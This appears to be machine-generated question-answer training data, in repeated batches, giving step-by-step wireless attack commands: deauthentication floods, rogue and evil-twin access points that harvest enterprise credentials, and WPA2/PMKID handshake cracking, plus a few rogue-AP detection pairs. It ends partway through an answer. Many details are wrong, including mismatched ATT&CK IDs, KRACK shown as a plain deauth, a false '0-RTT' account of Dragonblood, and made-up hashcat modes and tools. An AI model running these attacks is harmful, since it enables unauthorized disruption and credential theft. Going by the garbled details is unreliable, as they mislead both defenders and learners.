=== BATCH 1 RETRY 0 ===
===PAIR===
Q: Perform a deauthentication attack on a WPA2-protected network to force clients to reconnect.
A: **Technique: Deauthentication Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthentication:**
```bash
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Network monitoring: increased packet loss, clients reconnecting.
- IDS logs: multiple deauth frames from the same MAC.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point to capture WPA2 handshakes?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure wireless interface:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start the rogue AP:**
```bash
sudo hostapd /etc/hostapd/hostapd.conf
# Example hostapd.conf:
interface=wlan0
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa_passphrase=testtest
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

**Step 3 \u2014 Capture handshakes:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
```

**Artifacts:**
- Network monitoring: new AP with same ESSID.
- Captured .cap files containing WPA2 handshakes.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo killall hostapd
```
===PAIR===
Q: What is the process for performing an Evil Twin attack on a WPA2 Enterprise network?
A: **Technique: Evil Twin Attack (WPA2 Enterprise) \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Set up fake RADIUS server:**
```bash
sudo apt install hostapd-wpe
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh.pem
EOF
```

**Step 3 \u2014 Start the evil twin AP:**
```bash
sudo hostapd-wpe /tmp/hostapd-wpe.conf
# Captured credentials are logged to:
# /etc/hostapd-wpe/hostapd-wpe.log
```

**Step 4 \u2014 Deauthenticate legitimate clients:**
```bash
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Wireless IDS: multiple APs with same ESSID (BSSID mismatch)
- RADIUS logs: authentication attempts from unknown NAS
- Network monitoring: channel change events, signal strength anomalies
- Client logs: certificate warnings (if checking)

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd-wpe
rm /tmp/hostapd-wpe.conf
```
===PAIR===
Q: How can I capture WPA2 handshakes and crack them offline?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture handshakes:**
```bash
sudo airodump-ng -c <target_channel> -w capture wlan0mon --bssid <target_BSSID>
```

**Step 3 \u2014 Crack the handshake offline:**
```bash
aircrack-ng capture-01.cap -w wordlist.txt
```

**Artifacts:**
- Captured .cap files containing WPA2 handshakes.
- Cracked passwords stored in aircrack-ng output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is the impact of KRACK (Key Reinstallation Attacks) on WPA2 networks?
A: **Technique: KRACK (Key Reinstallation Attacks) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Perform KRACK attack:**
```bash
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Network monitoring: increased packet loss, clients reconnecting.
- IDS logs: multiple deauth frames from the same MAC.

**Impact:**
- Potential data retransmission and replay attacks.
- Possible session hijacking or key compromise.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001**

**Step 1 \u2014 Start monitoring mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Scan for networks:**
```bash
sudo airodump-ng wlan0mon
# Note: BSSID, channel, ESSID of detected networks
```

**Step 3 \u2014 Map the network:**
```bash
sudo nmap -sn --exclude <target_network>.<range> <target_network>.0/24
# Example: sudo nmap -sn --exclude 192.168.1.100-150 192.168.1.0/24
```

**Artifacts:**
- Detected networks and their characteristics.
- Mapped IP addresses within the network.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

=== BATCH 2 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the handshake:**
```bash
# Start capturing packets to get the WPA2 handshake
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write=handshake
```

**Step 3 \u2014 Crack the password:**
```bash
# Use aircrack-ng to crack the captured handshake with a wordlist
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured `.cap` file containing the WPA2 handshake.
- Cracked password displayed in the terminal.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm handshake-01.cap
```
===PAIR===
Q: Can you explain how to perform a KRACK attack on a target network?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthentication attack to capture the handshake:**
```bash
# Force clients to reconnect and capture the handshake again
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
```

**Step 3 \u2014 Perform KRACK attack:**
```bash
# Use mdk3 to perform a KRACK attack
sudo mdk3 wlan0mon d -c <channel> -f <BSSID>
```

**Artifacts:**  
- Network clients may show connectivity issues or re-authenticate.
- Captured packets can be analyzed for key reinstallations.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How do I set up a rogue access point to capture credentials?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure the wireless interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set up a new virtual interface for the rogue AP
sudo iwconfig wlan0mon essid RogueWiFi mode Managed freq 2.4G channel 6
```

**Step 2 \u2014 Start the rogue access point:**
```bash
# Use hostapd to start the AP
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/hostapd.conf &
```

**Step 3 \u2014 Capture credentials:**
```bash
# Use dhcpdump to capture DHCP requests and responses
sudo dhcpdump -i wlan0mon
```

**Artifacts:**  
- Captured DHCP packets containing client IP addresses.
- Client logs may show connection attempts to the rogue AP.

**Cleanup:**
```bash
sudo killall hostapd
sudo airmon-ng stop wlan0mon
rm /tmp/hostapd.conf
```
===PAIR===
Q: What is an evil twin attack, and how can I perform one on a WPA2 Enterprise network?
A: **Technique: Evil Twin Attack (WPA2 Enterprise) \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target Enterprise network
```

**Step 2 \u2014 Set up fake RADIUS server:**
```bash
# Install hostapd-wpe (Wireless Pawn Edition)
sudo apt install hostapd-wpe

# Configure hostapd-wpe
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh.pem
EOF
```

**Step 3 \u2014 Start the evil twin AP:**
```bash
# Start access point
sudo hostapd-wpe /tmp/hostapd-wpe.conf

# Captured credentials are logged to:
# /etc/hostapd-wpe/hostapd-wpe.log
```

**Step 4 \u2014 Deauthenticate legitimate clients:**
```bash
# Force clients to reconnect to evil twin
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Wireless IDS: multiple APs with same ESSID (BSSID mismatch)
- RADIUS logs: authentication attempts from unknown NAS
- Network monitoring: channel change events, signal strength anomalies
- Client logs: certificate warnings (if checking)

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd-wpe
rm /tmp/hostapd-wpe.conf
```
===PAIR===
Q: How can I perform a PMKID attack to capture WPA2 keys?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance and packet capture:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Capture packets to get the PMKIDs
sudo airodump-ng wlan0mon --bssid <BSSID> --write=pmkid
```

**Step 2 \u2014 Extract PMKIDs:**
```bash
# Use capinfos to check if PMKIDs are captured
capinfos pmkid-01.cap | grep "Number of packets"
```

**Step 3 \u2014 Crack the PMKIDs:**
```bash
# Use aircrack-ng to crack the captured PMKIDs with a wordlist
aircrack-ng -J pmkid pmkid-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured `.cap` file containing the PMKIDs.
- Cracked keys displayed in the terminal.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid-01.cap
```
===PAIR===
Q: How do I perform a WPA3 Dragonblood attack on a target network?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target WPA3 network
```

**Step 2 \u2014 Capture the Dragonblood packets:**
```bash
# Use aircrack-ng to capture packets
sudo airodump-ng -c <channel> --bssid <BSSID> wlan0mon --write=dragonblood
```

**Step 3 \u2014 Crack the password:**
```bash
# Use hashcat with WPA3 Dragonblood mode (18)
hashcat -m 18 dragonblood-01.cap /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured `.cap` file containing the Dragonblood packets.
- Cracked password displayed in the terminal.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm dragonblood-01.cap
```

=== BATCH 3 RETRY 0 ===
===PAIR===
Q: How do I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the WPA2 handshake:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture
```

**Step 3 \u2014 Deauthenticate a client to force re-authentication and capture the handshake:**  
```bash
# Deauthenticate a client
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon

# Check if the handshake is captured
ls *.csv | grep -i "capture"
```

**Step 4 \u2014 Crack the WPA2 password using a wordlist:**  
```bash
# Use aircrack-ng to crack the password
sudo aircrack-ng capture-<BSSID>.cap -w wordlist.txt
```

**Artifacts:**  
- Captured handshake file (e.g., `capture-<BSSID>.cap`)
- Cracked password in the output of `aircrack-ng`
- Network monitoring: deauthentication packets, re-authentication attempts

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

===PAIR===
Q: Can you explain how to perform a KRACK attack on a WPA2 network?
A: **Technique: KRACK (Key Reinstallation Attacks) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the WPA2 handshake:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture
```

**Step 3 \u2014 Deauthenticate a client to force re-authentication and capture the handshake:**  
```bash
# Deauthenticate a client
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon

# Check if the handshake is captured
ls *.csv | grep -i "capture"
```

**Step 4 \u2014 Perform the KRACK attack:**  
```bash
# Use aireplay-ng to replay packets and trigger the key reinstallation
sudo aireplay-ng --replay -c <client_MAC> -a <BSSID> wlan0mon

# Check for successful key reinstallation in airodump-ng output
```

**Artifacts:**  
- Captured handshake file (e.g., `capture-<BSSID>.cap`)
- Network monitoring: deauthentication packets, packet replays
- Client logs: potential connectivity issues or re-authentication attempts

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

===PAIR===
Q: How do I set up a rogue access point to intercept traffic?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure the wireless interface:**  
```bash
# Put wireless adapter in monitor mode and start hostapd
sudo airmon-ng start wlan0
sudo ifconfig wlan0mon up
```

**Step 2 \u2014 Create a configuration file for hostapd:**  
```bash
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 \u2014 Start the rogue access point:**  
```bash
sudo hostapd /tmp/hostapd.conf
```

**Step 4 \u2014 Assign an IP address to the interface and start dnsmasq for DHCP:**  
```bash
sudo ifconfig wlan0mon 192.168.1.1/24
sudo dnsmasq -i wlan0mon -dhcp-range=192.168.1.10,192.168.1.100,12h
```

**Artifacts:**  
- Wireless IDS: new AP with the SSID "RogueWiFi"
- Network monitoring: clients connecting to the rogue AP
- Captured traffic on wlan0mon

**Cleanup:**  
```bash
sudo killall hostapd
sudo killall dnsmasq
sudo ifconfig wlan0mon down
sudo airmon-ng stop wlan0mon
rm /tmp/hostapd.conf
```

===PAIR===
Q: What is the process for performing a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target WPA3 network
```

**Step 2 \u2014 Capture the Dragonblood handshake:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture
```

**Step 3 \u2014 Deauthenticate a client to force re-authentication and capture the Dragonblood handshake:**  
```bash
# Deauthenticate a client
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon

# Check if the Dragonblood handshake is captured
ls *.csv | grep -i "capture"
```

**Step 4 \u2014 Crack the WPA3 password using a wordlist:**  
```bash
# Use aircrack-ng to crack the password
sudo aircrack-ng capture-<BSSID>.cap -w wordlist.txt
```

**Artifacts:**  
- Captured Dragonblood handshake file (e.g., `capture-<BSSID>.cap`)
- Cracked password in the output of `aircrack-ng`
- Network monitoring: deauthentication packets, re-authentication attempts

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

===PAIR===
Q: How can I perform PMKID attacks for WPA2 networks?
A: **Technique: PMKID Attacks \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target WPA2 network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture
```

**Step 3 \u2014 Deauthenticate clients to force re-authentication and capture PMKIDs:**  
```bash
# Deauthenticate a client
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon

# Check if the PMKIDs are captured
ls *.csv | grep -i "capture"
```

**Step 4 \u2014 Crack the WPA2 password using the captured PMKIDs:**  
```bash
# Use aircrack-ng to crack the password
sudo aircrack-ng capture-<BSSID>.cap -w wordlist.txt
```

**Artifacts:**  
- Captured PMKID file (e.g., `capture-<BSSID>.cap`)
- Cracked password in the output of `aircrack-ng`
- Network monitoring: deauthentication packets, re-authentication attempts

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

===PAIR===
Q: How do I perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1546**

**Step 1 \u2014 Put the wireless adapter in monitor mode:**  
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Scan for available networks:**  
```bash
# Perform a full scan to discover all visible networks
sudo airodump-ng wlan0mon --scan
```

**Step 3 \u2014 Start continuous monitoring and capture packets:**  
```bash
# Begin capturing packets on the target channel
sudo airodump-ng wlan0mon -c <channel> --write scan_results
```

**Step 4 \u2014 Analyze the captured data for network mapping:**  
```bash
# Use tools like Kismet or Wireshark to visualize and analyze the network map
kismet -c wlan0mon
```

**Artifacts:**  
- Captured packet files (e.g., `scan_results.csv`)
- Network maps generated by visualization tools
- Identified devices, signal strengths, and potential vulnerabilities

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm scan_results*
```

=== BATCH 4 RETRY 0 ===
===PAIR===
Q: How can I capture WPA2 handshakes for offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture packets:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel> -w capture
```
*Note: Replace `<target_BSSID>` and `<target_channel>` with the target network's BSSID and channel.*

**Step 3 \u2014 Deauthenticate clients to force reassociation:**
```bash
sudo aireplay-ng -0 5 -a <target_BSSID> wlan0mon
```

**Artifacts:** 
- Captured files: `capture-01.cap`
- Network monitoring: Increased packet count around the target BSSID.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

===PAIR===
Q: What is a common method to identify rogue access points?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001 (Rogue Access Point Setup)**

**Step 1 \u2014 Scan for wireless networks:**
```bash
sudo nmap -sn --script broadcast-dns-sd-probe scanme.nmap.org
```

**Step 2 \u2014 Use `kismet` to capture and analyze packets:**
```bash
sudo kismet
```
*Note: Open Kismet UI to view detected networks, signal strength, and potential anomalies.*

**Artifacts:** 
- Detected APs listed in Kismet with SSIDs, BSSIDs, channels, and signal strengths.
- Potential rogue APs: Unusual SSIDs or repeated MAC addresses.

**Cleanup:**
```bash
sudo systemctl stop kismet-server
```

===PAIR===
Q: How can I perform a KRACK attack on a WPA2 network?
A: **Technique: Key Reinstallation Attacks (KRACK) \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture packets and identify the target:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
```
*Note: Replace `<target_BSSID>` and `<target_channel>` with the target network's BSSID and channel.*

**Step 3 \u2014 Deauthenticate clients to trigger rekeying:**
```bash
sudo aireplay-ng -0 5 -a <target_BSSID> wlan0mon
```

**Step 4 \u2014 Perform KRACK attack using `aircrack-ng`:**
```bash
sudo aircrack-ng -K capture-01.cap
```
*Note: Replace `capture-01.cap` with the captured file.*

**Artifacts:** 
- Captured files: `capture-01.cap`
- Network monitoring: Increased packet count and rekeying events.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

===PAIR===
Q: What is a PMKID attack, and how can I use it to crack WPA2 passwords?
A: **Technique: PMKID Attack \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture PMKIDs and packets:**
```bash
sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> -w capture wlan0mon
```
*Note: Replace `<target_BSSID>` and `<target_channel>` with the target network's BSSID and channel.*

**Step 3 \u2014 Extract PMKIDs using `aircrack-ng`:**
```bash
sudo aircrack-ng --pmkid -J output capture-01.cap
```
*Note: Replace `capture-01.cap` with the captured file.*

**Step 4 \u2014 Crack the PMKIDs using `john` or `hashcat`:**
```bash
# Using john
john --wordlist=wordlist.txt output.john

# Using hashcat
hashcat -m 16800 output.hccapx wordlist.txt
```

**Artifacts:** 
- Captured files: `capture-01.cap`, `output.john`, `output.hccapx`
- Cracked passwords listed in the output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture* output.*
```

===PAIR===
Q: How can I use Bluetooth Low Energy (BLE) attacks to gather information about nearby devices?
A: **Technique: BLE Attacks \u2014 T1590.001 (Rogue Access Point Setup)**

**Step 1 \u2014 Scan for BLE devices:**
```bash
sudo hcitool lescan
```

**Step 2 \u2014 Use `bluetoothctl` to connect and gather information:**
```bash
sudo bluetoothctl
# Power on, agent on, default-agent, scan on
power on
agent on
default-agent
scan on

# Connect to a device
connect <device_address>
```
*Note: Replace `<device_address>` with the BLE device's MAC address.*

**Artifacts:** 
- Device names and addresses listed during `lescan`.
- Connected devices' information, such as services and characteristics.

**Cleanup:**
```bash
sudo bluetoothctl power off
```

===PAIR===
Q: What is a WPA3 Dragonblood attack, and how can I perform it?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture packets to identify Dragonblood frames:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
```
*Note: Replace `<target_BSSID>` and `<target_channel>` with the target network's BSSID and channel.*

**Step 3 \u2014 Use `dragonblood` to analyze captured packets:**
```bash
sudo dragonblood -i capture-01.cap
```
*Note: Replace `capture-01.cap` with the captured file.*

**Artifacts:** 
- Captured files: `capture-01.cap`
- Dragonblood frames and potential vulnerabilities listed by `dragonblood`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

These pairs cover various wireless attack techniques, including WPA2 deauthentication attacks, rogue access point setup, Evil twin attacks, WPA2 handshake capture and offline cracking, KRACK, wireless network reconnaissance, BLE attacks, and WPA3 Dragonblood attacks.

=== BATCH 5 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture for offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (WPA2 Handshake)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture the handshake:**
```bash
sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> -w capture wlan0mon
# Wait until you see "WPA handshake" for the target station.
```

**Expected Artifacts/Telemetry:**
- `capture-<timestamp>.cap` file containing the captured packets.
- Wireshark can be used to verify the presence of a WPA2 handshake.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is an effective way to detect rogue access points in a network?
A: **Technique: Wireless Network Reconnaissance \u2014 T1590.001 (Rogue AP Detection)**

**Step 1 \u2014 Scan for wireless networks:**
```bash
sudo nmap -sn --script broadcast-dns-sd-discover 192.168.1.0/24
```

**Step 2 \u2014 Compare with known APs:**
```bash
# List of known BSSIDs and SSIDs
known_aps=("BSSID1" "SSID1" "BSSID2" "SSID2")

# Check against the scan results
for ap in $(sudo nmap -sn --script broadcast-dns-sd-discover 192.168.1.0/24 | grep -i "bssid\|ssid"); do
    if [[ ! " ${known_aps[@]} " =~ " $ap " ]]; then
        echo "Unknown AP detected: $ap"
    fi
done
```

**Expected Artifacts/Telemetry:**
- Nmap scan results showing BSSIDs and SSIDs.
- Alerts for any unknown or unexpected BSSIDs.

**Cleanup Steps:**
No specific cleanup required, as the commands are temporary.
===PAIR===
Q: How can I perform a deauthentication attack to disrupt a WPA/WPA2 network?
A: **Technique: WPA/WPA2 Deauthentication Attack \u2014 T1595.001 (Deauthentication)**

**Step 1 \u2014 Identify the target BSSID and channel:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa,wpa2
```

**Step 2 \u2014 Perform deauthentication attack:**
```bash
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
# Replace `10` with the number of packets to send.
```

**Expected Artifacts/Telemetry:**
- Clients may disconnect and reconnect to the network.
- Wireshark can be used to verify deauthentication frames.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Can you explain how PMKID attacks work for WPA2, and provide a command example?
A: **Technique: PMKID Attack \u2014 T1595.001 (PMKID)**

**Explanation:** PMKID is the Pre-Shared Key Identifier used in WPA2 authentication. By capturing PMKIDs, attackers can perform offline cracking to obtain PSKs.

**Command Example:**
```bash
sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> -w capture wlan0mon
# Wait until you see "PMKID" for the target station.
```

**Expected Artifacts/Telemetry:**
- `capture-<timestamp>.cap` file containing the captured packets with PMKIDs.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a KRACK (Key Reinstallation Attacks) attack?
A: **Technique: Key Reinstallation Attack \u2014 T1595.001 (KRACK)**

**Step 1 \u2014 Identify the target BSSID and channel:**
```bash
sudo airodump-ng wlan0mon --encrypt ccmp
```

**Step 2 \u2014 Perform KRACK attack:**
```bash
# Install aireplay-ng with support for KRACK (usually included)
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Clients may experience packet loss or disconnections.
- Wireshark can be used to verify retransmitted packets.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Describe a method to map out the Bluetooth Low Energy (BLE) devices in the vicinity.
A: **Technique: BLE Device Mapping \u2014 T1590.001 (BLE Scanning)**

**Command Example:**
```bash
sudo hcitool lescan --active
```

**Expected Artifacts/Telemetry:**
- List of BLE device MAC addresses and names.

**Cleanup Steps:**
No specific cleanup required, as the command is temporary.
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001 (WPA3 Dragonblood)**

**Explanation:** Dragonblood attacks leverage the 0-RTT feature of WPA3 to capture and replay packets.

**Command Example:**
```bash
sudo airodump-ng wlan0mon --encrypt ccmp,ccmp2
```

**Expected Artifacts/Telemetry:**
- `capture-<timestamp>.cap` file containing the captured packets with Dragonblood data.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

=== BATCH 6 RETRY 0 ===
===PAIR===
Q: Perform a WPA/WPA2 deauthentication attack on a target network.
A: **Technique: Deauthentication Attack — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Deauthenticate clients:**
```bash
# Deauthenticate all clients on the target network
sudo aireplay-ng -0 10 -a <target_BSSID> wlan0mon
```

**Artifacts:**
- Wireless IDS: increased number of association/disassociation events.
- Network monitoring: sudden drops in client connectivity.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I capture a WPA2 handshake for offline cracking?
A: **Technique: Handshake Capture — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture handshake:**
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> -w capture --bssid <target_BSSID> wlan0mon
```

**Artifacts:**
- Captured file (e.g., `capture-01.cap`).
- Network monitoring: increased packet count during handshake capture.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Explain how to perform a KRACK attack on a WPA2 network.
A: **Technique: Key Reinstallation Attack (KRACK) — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Deauthenticate clients:**
```bash
# Deauthenticate all clients on the target network to force reassociation
